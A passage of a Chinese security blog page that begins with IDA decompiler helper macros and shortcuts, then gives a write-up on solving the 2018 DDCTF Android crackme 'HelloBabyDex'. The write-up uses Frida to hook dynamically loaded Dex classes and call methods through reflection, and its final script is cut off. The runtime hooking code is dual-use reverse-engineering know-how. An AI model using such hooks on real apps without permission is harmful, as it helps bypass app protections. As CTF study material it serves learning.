{</span><br><span class="line">    U x2 = x;</span><br><span class="line">    int8 sx = __SETS__(x2);</span><br><span class="line">    <span class="keyword">return</span> (sx ^ __SETS__(y)) &amp; (sx ^ __SETS__(x2-y));</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  {</span><br><span class="line">    T y2 = y;</span><br><span class="line">    int8 sx = __SETS__(x);</span><br><span class="line">    <span class="keyword">return</span> (sx ^ __SETS__(y2)) &amp; (sx ^ __SETS__(x-y2));</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// overflow flag of addition (x+y)</span></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>, <span class="title">class</span> <span class="title">U</span>&gt; <span class="title">int8</span> __<span class="title">OFADD__</span>(<span class="title">T</span> <span class="title">x</span>, <span class="title">U</span> <span class="title">y</span>)</span></span><br><span class="line"><span class="class">{</span></span><br><span class="line">  <span class="keyword">if</span> ( <span class="keyword">sizeof</span>(T) &lt; <span class="keyword">sizeof</span>(U) )</span><br><span class="line">  {</span><br><span class="line">    U x2 = x;</span><br><span class="line">    int8 sx = __SETS__(x2);</span><br><span class="line">    <span class="keyword">return</span> ((<span class="number">1</span> ^ sx) ^ __SETS__(y)) &amp; (sx ^ __SETS__(x2+y));</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  {</span><br><span class="line">    T y2 = y;</span><br><span class="line">    int8 sx = __SETS__(x);</span><br><span class="line">    <span class="keyword">return</span> ((<span class="number">1</span> ^ sx) ^ __SETS__(y2)) &amp; (sx ^ __SETS__(x+y2));</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// carry flag of subtraction (x-y)</span></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>, <span class="title">class</span> <span class="title">U</span>&gt; <span class="title">int8</span> __<span class="title">CFSUB__</span>(<span class="title">T</span> <span class="title">x</span>, <span class="title">U</span> <span class="title">y</span>)</span></span><br><span class="line"><span class="class">{</span></span><br><span class="line">  <span class="keyword">int</span> size = <span class="keyword">sizeof</span>(T) &gt; <span class="keyword">sizeof</span>(U) ? <span class="keyword">sizeof</span>(T) : <span class="keyword">sizeof</span>(U);</span><br><span class="line">  <span class="keyword">if</span> ( size == <span class="number">1</span> )</span><br><span class="line">    <span class="keyword">return</span> uint8(x) &lt; uint8(y);</span><br><span class="line">  <span class="keyword">if</span> ( size == <span class="number">2</span> )</span><br><span class="line">    <span class="keyword">return</span> uint16(x) &lt; uint16(y);</span><br><span class="line">  <span class="keyword">if</span> ( size == <span class="number">4</span> )</span><br><span class="line">    <span class="keyword">return</span> uint32(x) &lt; uint32(y);</span><br><span class="line">  <span class="keyword">return</span> uint64(x) &lt; uint64(y);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// carry flag of addition (x+y)</span></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>, <span class="title">class</span> <span class="title">U</span>&gt; <span class="title">int8</span> __<span class="title">CFADD__</span>(<span class="title">T</span> <span class="title">x</span>, <span class="title">U</span> <span class="title">y</span>)</span></span><br><span class="line"><span class="class">{</span></span><br><span class="line">  <span class="keyword">int</span> size = <span class="keyword">sizeof</span>(T) &gt; <span class="keyword">sizeof</span>(U) ? <span class="keyword">sizeof</span>(T) : <span class="keyword">sizeof</span>(U);</span><br><span class="line">  <span class="keyword">if</span> ( size == <span class="number">1</span> )</span><br><span class="line">    <span class="keyword">return</span> uint8(x) &gt; uint8(x+y);</span><br><span class="line">  <span class="keyword">if</span> ( size == <span class="number">2</span> )</span><br><span class="line">    <span class="keyword">return</span> uint16(x) &gt; uint16(x+y);</span><br><span class="line">  <span class="keyword">if</span> ( size == <span class="number">4</span> )</span><br><span class="line">    <span class="keyword">return</span> uint32(x) &gt; uint32(x+y);</span><br><span class="line">  <span class="keyword">return</span> uint64(x) &gt; uint64(x+y);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="comment">// The following definition is not quite correct because it always returns</span></span><br><span class="line"><span class="comment">// uint64. The above C++ functions are good, though.</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __PAIR__(high, low) (((uint64)(high)&lt;&lt;sizeof(high)*8) | low)</span></span><br><span class="line"><span class="comment">// For C, we just provide macros, they are not quite correct.</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __ROL__(x, y) __rotl__(x, y)      <span class="comment">// Rotate left</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __ROR__(x, y) __rotr__(x, y)      <span class="comment">// Rotate right</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __CFSHL__(x, y) invalid_operation <span class="comment">// Generate carry flag for (x&lt;&lt;y)</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __CFSHR__(x, y) invalid_operation <span class="comment">// Generate carry flag for (x&gt;&gt;y)</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __CFADD__(x, y) invalid_operation <span class="comment">// Generate carry flag for (x+y)</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __CFSUB__(x, y) invalid_operation <span class="comment">// Generate carry flag for (x-y)</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __OFADD__(x, y) invalid_operation <span class="comment">// Generate overflow flag for (x+y)</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __OFSUB__(x, y) invalid_operation <span class="comment">// Generate overflow flag for (x-y)</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// No definition for rcl/rcr because the carry flag is unknown</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __RCL__(x, y)    invalid_operation <span class="comment">// Rotate left thru carry</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __RCR__(x, y)    invalid_operation <span class="comment">// Rotate right thru carry</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __MKCRCL__(x, y) invalid_operation <span class="comment">// Generate carry flag for a RCL</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __MKCRCR__(x, y) invalid_operation <span class="comment">// Generate carry flag for a RCR</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __SETP__(x, y)   invalid_operation <span class="comment">// Generate parity flag for (x-y)</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// In the decompilation listing there are some objects declarared as _UNKNOWN</span></span><br><span class="line"><span class="comment">// because we could not determine their types. Since the C compiler does not</span></span><br><span class="line"><span class="comment">// accept void item declarations, we replace them by anything of our choice,</span></span><br><span class="line"><span class="comment">// for example a char:</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _UNKNOWN char</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _MSC_VER</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> snprintf _snprintf</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> vsnprintf _vsnprintf</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure>
<h1 id="2-&#x5FEB;&#x6377;&#x952E;"><a href="#2-&#x5FEB;&#x6377;&#x952E;" class="headerlink" title="2. &#x5FEB;&#x6377;&#x952E;"></a>2. &#x5FEB;&#x6377;&#x952E;</h1><p>Shirt+F12&#xFF0C;&#x6253;&#x5F00;&#x5B57;&#x7B26;&#x4E32;&#x5185;&#x5BB9;&#x7A97;&#x53E3;<br>Ctrl+S&#xFF0C;&#x6709;&#x4E24;&#x4E2A;&#x7528;&#x9014;&#xFF0C;&#x5728;&#x6B63;&#x5E38;&#x6253;&#x5F00;so&#x6587;&#x4EF6;&#x7684;IDA View&#x89C6;&#x56FE;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x53EF;&#x4EE5;&#x67E5;&#x770B;so&#x5BF9;&#x5E94;&#x7684;Segement&#x4FE1;&#x606F;&#xFF1B;&#x5F53;&#x5728;&#x8C03;&#x8BD5;&#x9875;&#x9762;&#x7684;&#x65F6;&#x5019;&#xFF0C;ctrl+s&#x53EF;&#x4EE5;&#x5FEB;&#x901F;&#x5B9A;&#x4F4D;&#x5230;&#x6211;&#x4EEC;&#x60F3;&#x8981;&#x8C03;&#x8BD5;&#x7684;so&#x6587;&#x4EF6;&#x6620;&#x5C04;&#x5230;&#x5185;&#x5B58;&#x7684;&#x5730;&#x5740;<br>G&#x5FEB;&#x6377;&#x952E;&#xFF1A;&#x5728;IDA&#x8C03;&#x8BD5;&#x9875;&#x9762;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;S&#x952E;&#x5FEB;&#x901F;&#x8DF3;&#x8F6C;&#x5230;&#x6307;&#x5B9A;&#x7684;&#x5185;&#x5B58;&#x4F4D;&#x7F6E;<br>&#x8C03;&#x8BD5;&#x5FEB;&#x6377;&#x952E;&#xFF1A;F8&#x5355;&#x6B65;&#x8C03;&#x8BD5;&#xFF0C;F7&#x5355;&#x6B65;&#x8FDB;&#x5165;&#x8C03;&#x8BD5;&#xFF0C;F9&#x5FEB;&#x6377;&#x952E;&#x8FD0;&#x884C;</p>
<p>alt+t&#x53EF;&#x4EE5;&#x8FDB;&#x884C;&#x641C;&#x7D22;&#x65B9;&#x6CD5;&#x540D;&#xFF08;&#x5982;&#x679C;&#x9700;&#x8981;&#x641C;&#x7D22;&#x5B57;&#x7B26;&#x4E32;&#xFF0C;&#x53EA;&#x9700;&#x8981;&#x5148;shift+f12&#x5207;&#x6362;&#x5230;string&#x9009;&#x9879;&#x5361;&#xFF0C;&#x518D;&#x6B21;alt+t&#x5373;&#x53EF;&#xFF09;</p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2019/11/08/2019-11-08 使用frida-Hook动态加载Dex/">使用frida Hook动态加载Dex</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2019-11-08</time><div class="content"><p>&#x590D;&#x73B0;&#x4E86;2018DDCTF &#x7684;&#x4E00;&#x9053;&#x5B89;&#x5353;&#x9898;HelloBabyDex&#xFF0C;&#x53C2;&#x8003;&#x4E86;&#x7F51;&#x4E0A;&#x7684;&#x5F88;&#x591A;&#x8D44;&#x6599;&#xFF0C;&#x5B66;&#x5230;&#x4E86;&#x5F88;&#x591A;&#x77E5;&#x8BC6;&#xFF0C;&#x8BB0;&#x5F55;&#x4E00;&#x4E0B;&#x4F7F;&#x7528;frida Hook&#x52A8;&#x6001;&#x52A0;&#x8F7D;Dex&#x53BB;&#x89E3;&#x8FD9;&#x9053;&#x9898;&#x8FC7;&#x7A0B;&#x4E2D;&#x5B66;&#x5230;&#x7684;&#x4E1C;&#x897F;&#xFF0C;&#x671F;&#x95F4;&#x8FD8;&#x8865;&#x5145;&#x4E86;Java&#x5173;&#x4E8E;&#x53CD;&#x5C04;&#x673A;&#x5236;&#x7684;&#x77E5;&#x8BC6;&#x2026;..</p>
<h3 id="POINT"><a href="#POINT" class="headerlink" title="POINT"></a>POINT</h3><ol>
<li>Hook&#x52A8;&#x6001;&#x52A0;&#x8F7D;&#x7684;Dex&#x7684;&#x7C7B;&#x65B9;&#x6CD5;</li>
<li>Hook&#x91CD;&#x8F7D;&#x7684;&#x65B9;&#x6CD5;</li>
<li>&#x4F7F;&#x7528;Java.cast&#x8FDB;&#x884C;&#x7C7B;&#x578B;&#x8F6C;&#x6362;</li>
<li>&#x4F7F;&#x7528;Java.array&#x521B;&#x5EFA;&#x6570;&#x7EC4;</li>
<li>java&#x53CD;&#x5C04;&#x673A;&#x5236;&#x4E2D;&#x7684;&#x5B9E;&#x4F8B;&#x5316;&#x5BF9;&#x8C61;</li>
</ol>
<h3 id="PROLOGUE"><a href="#PROLOGUE" class="headerlink" title="PROLOGUE"></a>PROLOGUE</h3><p>&#x70ED;&#x4FEE;&#x590D;&#x5176;&#x5B9E;&#x662F;&#x4F7F;&#x7528;DexClassLoader&#x65B9;&#x6CD5;&#x53BB;&#x52A8;&#x6001;&#x52A0;&#x8F7D;&#x6587;&#x4EF6;&#xFF0C;&#x7136;&#x540E;&#x901A;&#x8FC7;&#x53CD;&#x5C04;&#x673A;&#x5236;&#x53BB;&#x8C03;&#x7528;&#x7C7B;&#x65B9;&#x6CD5;&#x6216;&#x6210;&#x5458;&#x53D8;&#x91CF;&#xFF0C;&#x800C;DexClassLoader&#x65B9;&#x6CD5;&#x771F;&#x6B63;&#x4F7F;&#x7528;&#x7684;&#x662F;&#x5176;&#x7236;&#x7C7B;&#x7684;&#x7236;&#x7C7B;&#x4E2D;&#x7684;loadClass&#x65B9;&#x6CD5;&#xFF0C;&#x90A3;&#x5C31;&#x53EF;&#x4EE5;&#x53BB;Hook DexClassLoader&#x8FD9;&#x4E2A;&#x7C7B;&#x4E0B;&#x7684;loadClass&#x65B9;&#x6CD5;&#x3002;</p>
<h3 id="Hook&#x91CD;&#x8F7D;&#x7684;&#x65B9;&#x6CD5;"><a href="#Hook&#x91CD;&#x8F7D;&#x7684;&#x65B9;&#x6CD5;" class="headerlink" title="Hook&#x91CD;&#x8F7D;&#x7684;&#x65B9;&#x6CD5;"></a>Hook&#x91CD;&#x8F7D;&#x7684;&#x65B9;&#x6CD5;</h3><p>&#x4F46;&#x662F;loadClass&#x6709;2&#x4E2A;&#x91CD;&#x8F7D;&#x65B9;&#x6CD5;&#xFF0C;&#x5728;frida&#x4E2D;&#x4F7F;&#x7528;overload&#x6307;&#x5B9A;Hook&#x7684;&#x91CD;&#x8F7D;&#x65B9;&#x6CD5;</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">public</span> Class&lt;?&gt; loadClass(String name) <span class="keyword">throws</span> ClassNotFoundException {</span><br><span class="line">        <span class="keyword">return</span> loadClass(name, <span class="keyword">false</span>);</span><br><span class="line">    }</span><br><span class="line">......</span><br><span class="line">    <span class="keyword">protected</span> Class&lt;?&gt; loadClass(String name, <span class="keyword">boolean</span> resolve)</span><br><span class="line">        <span class="keyword">throws</span> ClassNotFoundException</span><br><span class="line">    {</span><br><span class="line">            <span class="comment">// First, check if the class has already been loaded</span></span><br><span class="line">            Class&lt;?&gt; c = findLoadedClass(name);</span><br><span class="line">            <span class="keyword">if</span> (c == <span class="keyword">null</span>) {</span><br><span class="line">                <span class="keyword">try</span> {</span><br><span class="line">                    <span class="keyword">if</span> (parent != <span class="keyword">null</span>) {</span><br><span class="line">                        c = parent.loadClass(name, <span class="keyword">false</span>);</span><br><span class="line">                    } <span class="keyword">else</span> {</span><br><span class="line">                        c = findBootstrapClassOrNull(name);</span><br><span class="line">                    }</span><br><span class="line">                } <span class="keyword">catch</span> (ClassNotFoundException e) {</span><br><span class="line">                    <span class="comment">// ClassNotFoundException thrown if class not found</span></span><br><span class="line">                    <span class="comment">// from the non-null parent class loader</span></span><br><span class="line">                }</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (c == <span class="keyword">null</span>) {</span><br><span class="line">                    <span class="comment">// If still not found, then invoke findClass in order</span></span><br><span class="line">                    <span class="comment">// to find the class.</span></span><br><span class="line">                    c = findClass(name);</span><br><span class="line">                }</span><br><span class="line">            }</span><br><span class="line">            <span class="keyword">return</span> c;</span><br><span class="line">    }</span><br></pre></td></tr></table></figure>
<p>Hook&#x53EA;&#x6709;&#x4E00;&#x4E2A;&#x53C2;&#x6570;&#x4E3A;String&#x7C7B;&#x578B;&#x7684;&#x65B9;&#x6CD5;&#xFF1A;</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> dexclassLoader = Java.use(<span class="string">&quot;dalvik.system.DexClassLoader&quot;</span>);</span><br><span class="line">dexclassLoader.loadClass.overload(<span class="string">&apos;java.lang.String&apos;</span>).implementation = <span class="function"><span class="keyword">function</span>(<span class="params">name</span>)</span></span><br></pre></td></tr></table></figure>
<h3 id="&#x7C7B;&#x578B;&#x8F6C;&#x6362;"><a href="#&#x7C7B;&#x578B;&#x8F6C;&#x6362;" class="headerlink" title="&#x7C7B;&#x578B;&#x8F6C;&#x6362;"></a>&#x7C7B;&#x578B;&#x8F6C;&#x6362;</h3><p>&#x8FD9;&#x4E2A;name&#x5C31;&#x662F;&#x52A8;&#x6001;&#x52A0;&#x8F7D;&#x7684;&#x7C7B;&#x540D;&#xFF0C;&#x5373; <code>cn.chaitin.geektan.crackme.MainActivityPatch</code>&#xFF0C;&#x5F53;name&#x5339;&#x914D;&#x6210;&#x529F;&#x65F6;&#xFF0C;&#x8FD4;&#x56DE;&#x4E00;&#x4E2A;&#x7C7B;&#x5BF9;&#x8C61;<code>class cn.chaitin.geektan.crackme.MainActivityPatch</code>&#xFF0C;&#x6309;&#x7406;&#x8BF4;&#x5229;&#x7528;&#x53CD;&#x5C04;&#x673A;&#x5236;&#xFF0C;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x8FD9;&#x4E2A;&#x7C7B;&#x5BF9;&#x8C61;&#x53BB;&#x5B9E;&#x4F8B;&#x5316;&#x5BF9;&#x8C61;&#xFF0C;&#x4F46;&#x662F;&#x5C1D;&#x8BD5;&#x540E;&#x4E0D;&#x884C;&#xFF0C;&#x9700;&#x8981;&#x8FDB;&#x884C;&#x7C7B;&#x578B;&#x8F6C;&#x6362;</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> ClassUse = Java.use(<span class="string">&quot;java.lang.Class&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> hookClassCast = Java.cast(hookClass,ClassUse);</span><br></pre></td></tr></table></figure>
<p>&#x8FD9;&#x6837;&#x5C31;&#x83B7;&#x5F97;&#x4E86;&#x4E00;&#x4E2A;&#x6307;&#x5411;MainActivityPatch&#x7684;&#x7C7B;&#x5BF9;&#x8C61;</p>
<h3 id="&#x901A;&#x8FC7;&#x7C7B;&#x5BF9;&#x8C61;&#x5B9E;&#x4F8B;&#x5316;&#x5BF9;&#x8C61;"><a href="#&#x901A;&#x8FC7;&#x7C7B;&#x5BF9;&#x8C61;&#x5B9E;&#x4F8B;&#x5316;&#x5BF9;&#x8C61;" class="headerlink" title="&#x901A;&#x8FC7;&#x7C7B;&#x5BF9;&#x8C61;&#x5B9E;&#x4F8B;&#x5316;&#x5BF9;&#x8C61;"></a>&#x901A;&#x8FC7;&#x7C7B;&#x5BF9;&#x8C61;&#x5B9E;&#x4F8B;&#x5316;&#x5BF9;&#x8C61;</h3><p>&#x6709;&#x4E86;&#x7C7B;&#x5BF9;&#x8C61;&#xFF0C;&#x5C31;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x7C7B;&#x5BF9;&#x8C61;&#x7684; <code>getDeclaredConstructor(Class&lt;?&gt;...ParametersType)</code>&#x65B9;&#x6CD5;&#x83B7;&#x5F97;&#x6307;&#x5B9A;&#x53C2;&#x6570;&#x7684;&#x6784;&#x9020;&#x5668;&#xFF0C;&#x5373;&#x6784;&#x9020;&#x51FD;&#x6570;&#x5BF9;&#x8C61;&#x3002;&#x51FD;&#x6570;&#x7684;&#x53C2;&#x6570;&#x662F;&#x7C7B;&#x578B;&#x4E3A;&#x7C7B;&#x5BF9;&#x8C61;&#x7684;&#x6570;&#x7EC4;&#x3002;&#x67E5;&#x770B;&#x52A8;&#x6001;&#x52A0;&#x8F7D;&#x7C7B;&#x4E2D;<code>MainActivityPatch</code>&#x7684;&#x6784;&#x9020;&#x51FD;&#x6570;&#xFF0C;&#x53C2;&#x6570;&#x662F;Object&#x7C7B;&#x578B;&#x3002;</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">MainActivityPatch</span><span class="params">(Object obj)</span> </span>{</span><br><span class="line">    <span class="keyword">this</span>.originClass = (MainActivity) obj;</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
<p>&#x901A;&#x8FC7;frida&#x7684;Java.array&#x65B9;&#x6CD5;&#x53BB;&#x6784;&#x9020;Object&#x7C7B;&#x578B;&#x7684;&#x6570;&#x7EC4;&#xFF0C;&#x8BED;&#x6CD5;&#x662F;</p>
<figure class="highlight ceylon"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Java.array(<span class="string">&apos;type&apos;</span>,[<span class="keyword">value</span><span class="number">1</span>,<span class="keyword">value</span><span class="number">2</span>,....]);</span><br></pre></td></tr></table></figure>
<p>&#x6784;&#x9020;&#x8BED;&#x53E5;&#xFF0C;&#x8FD9;&#x4E2A;type&#x7684;&#x5199;&#x6CD5;&#x548C;smali&#x8BED;&#x6CD5;&#x4E00;&#x6837;</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> objectclass= Java.use(<span class="string">&quot;java.lang.Object&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> ConstructorParam =Java.array(<span class="string">&apos;Ljava.lang.Object;&apos;</span>,[objectclass.class]);</span><br></pre></td></tr></table></figure>
<p>&#x7136;&#x540E;&#x8C03;&#x7528;getDeclaredConstructor&#x65B9;&#x6CD5;&#x83B7;&#x5F97;&#x6784;&#x9020;&#x5668;</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = hookClassCast.getDeclaredConstructor(ConstructorParam);</span><br></pre></td></tr></table></figure>
<p>&#x8FD9;&#x6837;&#x901A;&#x8FC7;&#x6307;&#x5B9A;&#x6784;&#x9020;&#x51FD;&#x6570;&#x7684;&#x53C2;&#x6570;&#xFF0C;&#x8FD4;&#x56DE;&#x4E86;&#x4E00;&#x4E2A;&#x6307;&#x5B9A;&#x7684;&#x6784;&#x9020;&#x51FD;&#x6570;&#x5BF9;&#x8C61;&#xFF0C;<code>Constructor</code>&#x5BF9;&#x8C61;&#x4E2D;&#x6709;&#x4E00;&#x4E2A;&#x65B9;&#x6CD5;<code>newInstance(Object ... initargs)</code>&#xFF0C;&#x8FD9;&#x91CC;&#x7684;<code>initargs</code>&#x5373;&#x4E3A;&#x8981;&#x4F20;&#x7ED9;&#x6784;&#x9020;&#x51FD;&#x6570;&#x7684;&#x53C2;&#x6570;&#x3002;&#x4F7F;&#x7528;<code>newInstance</code>&#x5C31;&#x83B7;&#x53D6;&#x4E86;<code>MainActivityPatch</code>&#x7C7B;&#x7684;&#x5B9E;&#x4F8B;&#x5316;&#x5BF9;&#x8C61;</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> orininclass = Java.use(<span class="string">&quot;cn.chaitin.geektan.crackme.MainActivity&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> mainAc = orininclass.$<span class="keyword">new</span>();</span><br><span class="line"><span class="keyword">var</span> instance = Constructor.newInstance([mainAc]);</span><br></pre></td></tr></table></figure>
<h3 id="&#x8C03;&#x7528;&#x5B9E;&#x4F8B;&#x5316;&#x5BF9;&#x8C61;&#x7684;&#x65B9;&#x6CD5;"><a href="#&#x8C03;&#x7528;&#x5B9E;&#x4F8B;&#x5316;&#x5BF9;&#x8C61;&#x7684;&#x65B9;&#x6CD5;" class="headerlink" title="&#x8C03;&#x7528;&#x5B9E;&#x4F8B;&#x5316;&#x5BF9;&#x8C61;&#x7684;&#x65B9;&#x6CD5;"></a>&#x8C03;&#x7528;&#x5B9E;&#x4F8B;&#x5316;&#x5BF9;&#x8C61;&#x7684;&#x65B9;&#x6CD5;</h3><p>&#x5F97;&#x5230;&#x5B9E;&#x4F8B;&#x5316;&#x7684;&#x5BF9;&#x8C61;&#x540E;&#xFF0C;&#x5C31;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;getDeclaredMethods&#x65B9;&#x6CD5;&#x83B7;&#x53D6;&#x6240;&#x6709;&#x8FD9;&#x4E2A;&#x7C7B;&#x7684;&#x7C7B;&#x65B9;&#x6CD5;&#xFF0C;&#x67E5;&#x770B;getDeclaredMethods&#x7684;&#x539F;&#x578B;</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Method[] getDeclaredMethods() <span class="keyword">throws</span> SecurityException {</span><br><span class="line">......</span><br><span class="line">   }</span><br></pre></td></tr></table></figure>
<p>&#x901A;&#x8FC7;&#x539F;&#x578B;&#x53EF;&#x4EE5;&#x77E5;&#x9053;&#x8BE5;&#x65B9;&#x6CD5;&#x8FD4;&#x56DE;&#x7684;&#x662F;Method&#x6570;&#x7EC4;&#xFF0C;Joseph&#x51FD;&#x6570;&#x5728;&#x6570;&#x7EC4;&#x4E2D;&#x7B2C;&#x4E00;&#x4E2A;&#x3002;</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> func = hookClassCast.getDeclaredMethods();</span><br><span class="line"><span class="keyword">var</span> f = func[<span class="number">0</span>];</span><br></pre></td></tr></table></figure>
<p>&#x77E5;&#x9053;&#x76EE;&#x6807;&#x51FD;&#x6570;&#x7684;&#x4F4D;&#x7F6E;&#x540E;&#xFF0C;&#x5C31;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;Method.invoke&#x65B9;&#x6CD5;&#x8C03;&#x7528;&#x8BE5;&#x65B9;&#x6CD5;&#xFF0C;&#x770B;&#x4E0B;invoke&#x65B9;&#x6CD5;&#x7684;&#x53C2;&#x6570;&#xFF0C;&#x7B2C;&#x4E00;&#x4E2A;&#x53C2;&#x6570;&#x662F;&#x6267;&#x884C;&#x8FD9;&#x4E2A;&#x65B9;&#x6CD5;&#x7684;&#x5BF9;&#x8C61;&#x5B9E;&#x4F8B;&#xFF0C;&#x7B2C;&#x4E8C;&#x4E2A;&#x53C2;&#x6570;&#x662F;&#x5E26;&#x5165;&#x7684;&#x5B9E;&#x9645;&#x503C;&#x6570;&#x7EC4;</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">native</span> Object <span class="title">invoke</span><span class="params">(Object obj, Object... args)</span></span></span><br></pre></td></tr></table></figure>
<p>&#x6240;&#x4EE5;&#x6267;&#x884C;Joseph(5&#xFF0C;6)&#x7684;js&#x8BED;&#x53E5;&#x662F;</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> Integerclass = Java.use(<span class="string">&quot;java.lang.Integer&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> num1 = Integerclass.$<span class="keyword">new</span>(<span class="number">5</span>);</span><br><span class="line"><span class="keyword">var</span> num2 = Integerclass.$<span class="keyword">new</span>(<span class="number">6</span>);</span><br><span class="line"><span class="keyword">var</span> numArr1 = Java.array(<span class="string">&apos;Ljava.lang.Object;&apos;</span>,[num1,num2]);</span><br><span class="line"><span class="keyword">var</span> rtn1 = f.invoke(instance,numArr1);</span><br></pre></td></tr></table></figure>
<p>&#x6700;&#x7EC8;&#x7684;EXP&#x5982;&#x4E0B;&#xFF08;&#x53C2;&#x8003;&#x770B;&#x96EA;&#x8BBA;&#x575B;<a href="https://bbs.pediy.com/user-811277.htm" target="_blank" rel="noopener">ghostmazeW</a>&#xFF09;</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span 